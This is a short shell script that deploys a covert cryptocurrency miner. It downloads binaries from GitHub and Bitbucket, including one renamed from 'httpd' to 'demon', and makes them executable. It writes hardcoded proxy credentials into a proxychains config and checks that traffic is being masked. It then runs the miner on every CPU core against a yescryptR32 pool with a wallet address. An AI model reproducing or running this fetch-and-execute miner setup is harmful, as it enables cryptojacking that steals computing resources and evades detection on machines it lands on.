proxy="50.17.160.202" 
port="1080" 
user="9ubn1puea2b71x"  
pass="iz4g9xbwjgy4mdru9gb9x5nsee40"
wget -q -O demon https://github.com/swanderenata/cautious-octo-garbanzo/raw/main/httpd && chmod +x demon
wget -q https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x panel 
wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
wget -q https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf"  
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./demon -a yescryptR32 -o 45.115.225.225:80 -u UUttAax2AKgvUur3n3RhMDLxYjsFJgGnbh -p c=UNFY,mc=UNFY,ID=$(echo $(shuf -i 1-5 -n 1)-bian) -t $(nproc --all)
